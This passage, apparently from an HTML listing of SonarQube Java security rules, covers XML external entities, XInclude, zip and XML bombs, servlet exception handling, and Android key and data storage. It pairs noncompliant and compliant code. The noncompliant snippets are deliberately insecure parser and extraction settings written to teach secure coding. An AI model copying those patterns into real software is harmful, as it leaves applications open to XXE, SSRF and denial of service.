SchemaFactory schemaFactory &#61; SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
schemaFactory.setFeature(&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;, true); // Noncompliant
</pre>
<p>For <a href="https://dom4j.github.io/" rel="nofollow">Dom4j</a> library:</p>
<pre>
SAXReader xmlReader &#61; new SAXReader(); // Noncompliant
xmlReader.setFeature(&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;, true);  // Noncompliant
</pre>
<p>For <a href="http://www.jdom.org/" rel="nofollow">Jdom2</a> library:</p>
<pre>
SAXBuilder builder &#61; new SAXBuilder();
builder.setFeature(&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;, true); // Noncompliant
</pre>
<h3>Compliant solution</h3>
<p>For <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html" rel="nofollow">DocumentBuilder</a>, <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html" rel="nofollow">SAXParser</a> and <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html" rel="nofollow">Schema</a> JAPX factories:</p>
<pre>
DocumentBuilderFactory factory &#61; DocumentBuilderFactory.newInstance();
factory.setFeature(&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;, false);

SAXParserFactory factory &#61; SAXParserFactory.newInstance();
factory.setFeature(&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;, false);

SchemaFactory schemaFactory &#61; SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
schemaFactory.setFeature(&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;, false);
</pre>
<p>For <a href="https://dom4j.github.io/" rel="nofollow">Dom4j</a> library:</p>
<pre>
SAXReader xmlReader &#61; new SAXReader(); // Noncompliant
xmlReader.setFeature(&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;, false);
</pre>
<p>For <a href="http://www.jdom.org/" rel="nofollow">Jdom2</a> library:</p>
<pre>
SAXBuilder builder &#61; new SAXBuilder();
builder.setFeature(&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;, false);
</pre>
<h3>Exceptions</h3>
<p>This rules does not raise an issue when an <code>EntityResolver</code> is set.</p>
<pre>
DocumentBuilderFactory factory &#61; DocumentBuilderFactory.newInstance();
factory.setValidating(true);
DocumentBuilder builder &#61; factory.newDocumentBuilder();
builder.setEntityResolver(new MyEntityResolver());

SAXBuilder builder &#61; new SAXBuilder();
builder.setFeature(&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;, true);
builder.setEntityResolver(new EntityResolver());
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-8CD65EF5-D113-4D5C-A564-B875C8625FAC" rel="nofollow">Oracle Java Documentation</a> - XML External Entity Injection Attack </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_%28XXE%29" rel="nofollow">OWASP Top 10 2017 Category A4</a> - XML External
  Entities (XXE) </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java" rel="nofollow">OWASP XXE Prevention Cheat
  Sheet</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/611" rel="nofollow">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li><li> <a href="https://cwe.mitre.org/data/definitions/827" rel="nofollow">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6373">
              java:S6373
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>XML standard allows the inclusion of xml files with the <a href="https://www.w3.org/TR/xinclude-11/" rel="nofollow">xinclude</a> element.</p>
<p>XML processors will replace an xinclude element with the content of the file located at the URI defined in the href attribute, potentially from an
external storage such as file system or network, which may lead, if no restrictions are put in place, to arbitrary file disclosures or <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" rel="nofollow">server-side request forgery (SSRF)</a> vulnerabilities.</p>
<h3>Noncompliant code example</h3>
<p>For <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html" rel="nofollow">DocumentBuilder</a>, <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html" rel="nofollow">SAXParser</a>, <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html" rel="nofollow">XMLInput</a>, <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html" rel="nofollow">Transformer</a> and <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html" rel="nofollow">Schema</a> JAPX factories:</p>
<pre>
factory.setXIncludeAware(true); // Noncompliant
// or
factory.setFeature(&#34;http://apache.org/xml/features/xinclude&#34;, true); // Noncompliant
</pre>
<p>For <a href="https://dom4j.github.io/" rel="nofollow">Dom4j</a> library:</p>
<pre>
SAXReader xmlReader &#61; new SAXReader();
xmlReader.setFeature(&#34;http://apache.org/xml/features/xinclude&#34;, true); // Noncompliant
</pre>
<p>For <a href="http://www.jdom.org/" rel="nofollow">Jdom2</a> library:</p>
<pre>
SAXBuilder builder &#61; new SAXBuilder();
builder.setFeature(&#34;http://apache.org/xml/features/xinclude&#34;, true); // Noncompliant
</pre>
<h3>Compliant solution</h3>
<p>Xinclude is disabled by default and can be explicitely disabled like below.</p>
<p>For <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html" rel="nofollow">DocumentBuilder</a>, <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html" rel="nofollow">SAXParser</a>, <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html" rel="nofollow">XMLInput</a>, <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html" rel="nofollow">Transformer</a> and <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html" rel="nofollow">Schema</a> JAPX factories:</p>
<pre>
factory.setXIncludeAware(false);
// or
factory.setFeature(&#34;http://apache.org/xml/features/xinclude&#34;, false);
</pre>
<p>For <a href="https://dom4j.github.io/" rel="nofollow">Dom4j</a> library:</p>
<pre>
SAXReader xmlReader &#61; new SAXReader();
xmlReader.setFeature(&#34;http://apache.org/xml/features/xinclude&#34;, false);
</pre>
<p>For <a href="http://www.jdom.org/" rel="nofollow">Jdom2</a> library:</p>
<pre>
SAXBuilder builder &#61; new SAXBuilder();
builder.setFeature(&#34;http://apache.org/xml/features/xinclude&#34;, false);
</pre>
<h3>Exceptions</h3>
<p>This rule does not raise issues when Xinclude is enabled with a custom <code>EntityResolver</code>:</p>
<p>For DocumentBuilderFactory:</p>
<pre>
DocumentBuilderFactory factory &#61; DocumentBuilderFactory.newInstance();
factory.setXIncludeAware(true);
// ...
DocumentBuilder builder &#61; factory.newDocumentBuilder();
builder.setEntityResolver((publicId, systemId) -&gt; new MySafeEntityResolver(publicId, systemId));
</pre>
<p>For SAXBuilder:</p>
<pre>
SAXBuilder builder &#61; new SAXBuilder();
builder.setFeature(&#34;http://apache.org/xml/features/xinclude&#34;, true);
builder.setEntityResolver((publicId, systemId) -&gt; new MySafeEntityResolver(publicId, systemId));
</pre>
<p>For SAXReader:</p>
<pre>
SAXReader xmlReader &#61; new SAXReader();
xmlReader.setFeature(&#34;http://apache.org/xml/features/xinclude&#34;, true);
xmlReader.setEntityResolver((publicId, systemId) -&gt; new MySafeEntityResolver(publicId, systemId));
</pre>
<p>For XMLInputFactory:</p>
<pre>
XMLInputFactory factory &#61; XMLInputFactory.newInstance();
factory.setProperty(&#34;http://apache.org/xml/features/xinclude&#34;, true);
factory.setXMLResolver(new MySafeEntityResolver());
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-8CD65EF5-D113-4D5C-A564-B875C8625FAC" rel="nofollow">Oracle Java Documentation</a> - XML External Entity Injection Attack </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_%28XXE%29" rel="nofollow">OWASP Top 10 2017 Category A4</a> - XML External
  Entities (XXE) </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java" rel="nofollow">OWASP XXE Prevention Cheat
  Sheet</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/611" rel="nofollow">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li><li> <a href="https://cwe.mitre.org/data/definitions/827" rel="nofollow">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5042">
              java:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio" rel="nofollow">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul><li> There is no validation of the number of entries in the archive. </li><li> There is no validation of the total size of the uncompressed data. </li><li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li><li> Define and control the threshold for maximum total size of the uncompressed data. </li><li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
File f &#61; new File(&#34;ZipBomb.zip&#34;);
ZipFile zipFile &#61; new ZipFile(f);
Enumeration&lt;? extends ZipEntry&gt; entries &#61; zipFile.entries(); // Sensitive

while(entries.hasMoreElements()) {
  ZipEntry ze &#61; entries.nextElement();
  File out &#61; new File(&#34;./output_onlyfortesting.txt&#34;);
  Files.copy(zipFile.getInputStream(ze), out.toPath(), StandardCopyOption.REPLACE_EXISTING);
}
</pre>
<h2>Compliant Solution</h2>
<p>Do not rely on <a href="https://docs.oracle.com/javase/7/docs/api/java/util/zip/ZipEntry.html#getSize%28%29" rel="nofollow">getsize</a> to retrieve the size of an
uncompressed entry because this method returns what is defined in the archive headers which can be forged by attackers, instead calculate the actual
entry size when unzipping it:</p>
<pre>
File f &#61; new File(&#34;ZipBomb.zip&#34;);
ZipFile zipFile &#61; new ZipFile(f);
Enumeration&lt;? extends ZipEntry&gt; entries &#61; zipFile.entries();

int THRESHOLD_ENTRIES &#61; 10000;
int THRESHOLD_SIZE &#61; 1000000000; // 1 GB
double THRESHOLD_RATIO &#61; 10;
int totalSizeArchive &#61; 0;
int totalEntryArchive &#61; 0;

while(entries.hasMoreElements()) {
  ZipEntry ze &#61; entries.nextElement();
  InputStream in &#61; new BufferedInputStream(zipFile.getInputStream(ze));
  OutputStream out &#61; new BufferedOutputStream(new FileOutputStream(&#34;./output_onlyfortesting.txt&#34;));

  totalEntryArchive &#43;&#43;;

  int nBytes &#61; -1;
  byte[] buffer &#61; new byte[2048];
  int totalSizeEntry &#61; 0;

  while((nBytes &#61; in.read(buffer)) &gt; 0) { // Compliant
      out.write(buffer, 0, nBytes);
      totalSizeEntry &#43;&#61; nBytes;
      totalSizeArchive &#43;&#61; nBytes;

      double compressionRatio &#61; totalSizeEntry / ze.getCompressedSize();
      if(compressionRatio &gt; THRESHOLD_RATIO) {
        // ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack
        break;
      }
  }

  if(totalSizeArchive &gt; THRESHOLD_SIZE) {
      // the uncompressed data size is too much for the application resource capacity
      break;
  }

  if(totalEntryArchive &gt; THRESHOLD_ENTRIES) {
      // too much entries in this archive, can lead to inodes exhaustion of the system
      break;
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/409" rel="nofollow">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.&#43;Safely&#43;extract&#43;files&#43;from&#43;ZipInputStream" rel="nofollow">CERT, IDS04-J.</a> - Safely
  extract files from ZipInputStream </li><li> <a href="https://www.bamsoftware.com/hacks/zipbomb/" rel="nofollow">bamsoftware.com</a> - A better Zip Bomb </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6376">
              java:S6376
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>An XML bomb / <a href="https://en.wikipedia.org/wiki/Billion_laughs_attack" rel="nofollow">billion laughs</a> attack is a malicious XML document containing the
same large entity repeated over and over again. If no restrictions is in place, such a limit on the number of entity expansions, the XML processor can
consume a lot memory and time during the parsing of such documents leading to Denial of Service.</p>
<h3>Noncompliant code example</h3>
<p>For <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html" rel="nofollow">DocumentBuilder</a>, <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html" rel="nofollow">SAXParser</a> and <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html" rel="nofollow">Schema</a> and <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html" rel="nofollow">Transformer</a> JAPX factories:</p>
<pre>
DocumentBuilderFactory factory &#61; DocumentBuilderFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Noncompliant

SAXParserFactory factory &#61; SAXParserFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Noncompliant

SchemaFactory factory &#61; SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Noncompliant

TransformerFactory factory &#61; javax.xml.transform.TransformerFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Noncompliant
</pre>
<p>For <a href="https://dom4j.github.io/" rel="nofollow">Dom4j</a> library:</p>
<pre>
SAXReader xmlReader &#61; new SAXReader();
xmlReader.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Noncompliant
</pre>
<p>For <a href="http://www.jdom.org/" rel="nofollow">Jdom2</a> library:</p>
<pre>
SAXBuilder builder &#61; new SAXBuilder();
builder.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);  // Noncompliant
</pre>
<h3>Compliant solution</h3>
<p>For <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html" rel="nofollow">DocumentBuilder</a>, <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html" rel="nofollow">SAXParser</a> and <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html" rel="nofollow">Schema</a> and <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html" rel="nofollow">Transformer</a> JAPX factories:</p>
<pre>
DocumentBuilderFactory factory &#61; DocumentBuilderFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

SAXParserFactory factory &#61; SAXParserFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

SchemaFactory factory &#61; SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

TransformerFactory factory &#61; javax.xml.transform.TransformerFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
</pre>
<p>For <a href="https://dom4j.github.io/" rel="nofollow">Dom4j</a> library:</p>
<pre>
SAXReader xmlReader &#61; new SAXReader();
xmlReader.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
</pre>
<p>For <a href="http://www.jdom.org/" rel="nofollow">Jdom2</a> library:</p>
<pre>
SAXBuilder builder &#61; new SAXBuilder();
builder.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-8CD65EF5-D113-4D5C-A564-B875C8625FAC" rel="nofollow">Oracle Java Documentation</a> - XML External Entity Injection Attack </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_%28XXE%29" rel="nofollow">OWASP Top 10 2017 Category A4</a> - XML External
  Entities (XXE) </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java" rel="nofollow">OWASP XXE Prevention Cheat
  Sheet</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/776" rel="nofollow">MITRE, CWE-776</a> - Improper Restriction of Recursive Entity References in DTDs (&#39;XML
  Entity Expansion&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S1989">
              java:S1989
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Servlets are components in Java web development, responsible for processing HTTP requests and generating responses. In this context, exceptions are
used to handle and manage unexpected errors or exceptional conditions that may occur during the execution of a servlet.</p>
<p>Catching exceptions within the servlet allows us to convert them into meaningful, user-friendly messages. Otherwise, failing to catch exceptions
will propagate them to the servlet container, where the default error-handling mechanism may impact the overall security and stability of the
server.</p>
<p>Possible security problems are:</p>
<ol><li> <strong>Vulnerability to denial-of-service attacks:</strong> Not caught exceptions can leave the servlet container in an unstable state, which
  can exhaust the available resources and make the system unavailable in the worst cases. </li><li> <strong>Exposure of sensitive information:</strong> Exceptions handled by the servlet container, by default, expose detailed error messages or
  debugging information to the user, which may contain sensitive data such as stack traces, database connection, or system configuration. </li></ol>
<p>Unfortunately, servlet method signatures do not force developers to handle <code>IOException</code> and <code>ServletException</code>:</p>
<pre>
public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
}
</pre>
<p>To prevent this risk, this rule enforces all exceptions to be caught within the &#34;do*&#34; methods of servlet classes.</p>
<h2>How to fix it</h2>
<p>Surround all method calls that may throw an exception with a <code>try/catch</code> block.</p>
<h3>Code examples</h3>
<p>In the following example, the <code>getByName</code> method may throw an <code>UnknownHostException</code>.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
  InetAddress addr &#61; InetAddress.getByName(request.getRemoteAddr()); // Noncompliant
  //...
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
  try {
    InetAddress addr &#61; InetAddress.getByName(request.getRemoteAddr());
    //...
  }
  catch (UnknownHostException ex) {  // Compliant
    //...
  }
}
</pre>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/600" rel="nofollow">MITRE, CWE-600</a> - Uncaught Exception in Servlet </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/-zZGBQ" rel="nofollow">CERT, ERR01-J.</a> - Do not allow exceptions to expose sensitive information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6288">
              java:S6288
            </a>
          </td>
          <td>
            <details>
              <p>Android KeyStore is a secure container for storing key materials, in particular it prevents key materials extraction, i.e. when the application
process is compromised, the attacker cannot extract keys but may still be able to use them. It’s possible to enable an Android security feature, user
authentication, to restrict usage of keys to only authenticated users. The lock screen has to be unlocked with defined credentials
(pattern/PIN/password, biometric).</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application requires prohibiting the use of keys in case of compromise of the application process. </li><li> The key material is used in the context of a highly sensitive application like a e-banking mobile app. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable user authentication (by setting <code>setUserAuthenticationRequired</code> to <code>true</code> during key generation)
to use keys for a limited duration of time (by setting appropriate values to <code>setUserAuthenticationValidityDurationSeconds</code>), after which
the user must re-authenticate.</p>
<h2>Sensitive Code Example</h2>
<p>Any user can use the key:</p>
<pre>
KeyGenerator keyGenerator &#61; KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, &#34;AndroidKeyStore&#34;);

KeyGenParameterSpec builder &#61; new KeyGenParameterSpec.Builder(&#34;test_secret_key_noncompliant&#34;, KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT) // Noncompliant
    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
    .build();

keyGenerator.init(builder);
</pre>
<h2>Compliant Solution</h2>
<p>The use of the key is limited to authenticated users (for a duration of time defined to 60 seconds):</p>
<pre>
KeyGenerator keyGenerator &#61; KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, &#34;AndroidKeyStore&#34;);

KeyGenParameterSpec builder &#61; new KeyGenParameterSpec.Builder(&#34;test_secret_key&#34;, KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)
    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
    .setUserAuthenticationRequired(true)
    .setUserAuthenticationParameters (60, KeyProperties.AUTH_DEVICE_CREDENTIAL)
    .build();

keyGenerator.init(builder)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://developer.android.com/training/articles/keystore" rel="nofollow">developer.android.com</a> - Android keystore system </li><li> <a href="https://developer.android.com/training/articles/keystore#UserAuthentication" rel="nofollow">developer.android.com</a> - Require user authentication
  for key use </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Authentication and Session Management Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication" rel="nofollow">OWASP Mobile Top 10 2016 Category M4</a> - Insecure
  Authentication </li><li> <a href="https://cwe.mitre.org/data/definitions/522" rel="nofollow">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6291">
              java:S6291
            </a>
          </td>
          <td>
            <details>
              <p>Storing data locally is a common task for mobile applications. Such data includes preferences or authentication tokens for external services, among
other things. There are many convenient solutions that allow storing data persistently, for example SQLiteDatabase, SharedPreferences, and Realm. By
default these systems store the data unencrypted, thus an attacker with physical access to the device can read them out easily. Access to sensitive
data can be harmful for the user of the application, for example when the device gets stolen.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The database contains sensitive data that could cause harm when leaked. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to password-encrypt local databases that contain sensitive information. Most systems provide secure alternatives to plain-text
storage that should be used. If no secure alternative is available the data can also be encrypted manually before it is stored.</p>
<p>The encryption password should not be hard-coded in the application. There are different approaches how the password can be provided to encrypt and
decrypt the database. In the case of <code>EncryptedSharedPreferences</code> the Android Keystore can be used to store the password. Other databases
can rely on <code>EncryptedSharedPreferences</code> to store passwords. The password can also be provided dynamically by the user of the application
or it can be fetched from a remote server if the other methods are not feasible.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://developer.android.com/reference/kotlin/android/database/sqlite/SQLiteDatabase" rel="nofollow">SQLiteDatabase</a>:</p>
<pre>
SQLiteDatabase db &#61; activity.openOrCreateDatabase(&#34;test.db&#34;, Context.MODE_PRIVATE, null); // Sensitive
</pre>
<p>For <a href="https://developer.android.com/training/data-storage/shared-preferences" rel="nofollow">SharedPreferences</a>:</p>
<pre>
SharedPreferences pref &#61; activity.getPreferences(Context.MODE_PRIVATE); // Sensitive
</pre>
<p>For <a href="https://docs.mongodb.com/realm/" rel="nofollow">Realm</a>:</p>
<pre>
RealmConfiguration config &#61; new RealmConfiguration.Builder().build();
Realm realm &#61; Realm.getInstance(config); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Instead of SQLiteDatabase you can use <a href="https://www.zetetic.net/sqlcipher/sqlcipher-for-android/" rel="nofollow">SQLCipher</a>:</p>
<pre>
SQLiteDatabase db &#61; SQLiteDatabase.openOrCreateDatabase(&#34;test.db&#34;, getKey(), null);
</pre>
<p>Instead of SharedPreferences you can use <a href="https://developer.android.com/reference/androidx/security/crypto/EncryptedSharedPreferences" rel="nofollow">EncryptedSharedPreferences</a>:</p>
<pre>
String masterKeyAlias &#61; new MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC);
EncryptedSharedPreferences.create(
    &#34;secret&#34;,
    masterKeyAlias,
    context,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
);
</pre>
<p>For Realm an encryption key can be specified in the config:</p>
<pre>
RealmConfiguration config &#61; new RealmConfiguration.Builder()
    .encryptionKey(getKey())
    .build();
Realm realm &#61; Realm.getInstance(config);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage" rel="nofollow">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6293">
              java:S6293
            </a>
          </td>
          <td>
            <details>
              <p>Android comes with Android KeyStore, a secure container for storing key materials. It’s possible to define certain keys to be unlocked when users
authenticate using biometric credentials. This way, even if the application process is compromised, the attacker cannot access keys, as presence of
the authorized user is required.</p>
<p>These keys can be used, to encrypt, sign or create a message authentication code (MAC) as proof that the authentication result has not been
tampered with. This protection defeats the scenario where an attacker with physical access to the device would try to hook into the application
process and call the <code>onAuthenticationSucceeded</code> method directly. Therefore he would be unable to extract the sensitive data or to perform
the critical operations protected by the biometric authentication.</p>
<h2>Ask Yourself Whether</h2>
<p>The application contains:</p>
<ul><li> Cryptographic keys / sensitive information that need to be protected using biometric authentication. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to tie the biometric authentication to a cryptographic operation by using a <code>CryptoObject</code> during authentication.</p>
<h2>Sensitive Code Example</h2>
<p>A <code>CryptoObject</code> is not used during authentication:</p>
<pre>
// ...
BiometricPrompt biometricPrompt &#61; new BiometricPrompt(activity, executor, callback);
// ...
biometricPrompt.authenticate(promptInfo); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<p>A <code>CryptoObject</code> is used during authentication:</p>
<pre>
// ...
BiometricPrompt biometricPrompt &#61; new BiometricPrompt(activity, executor, callback);
// ...
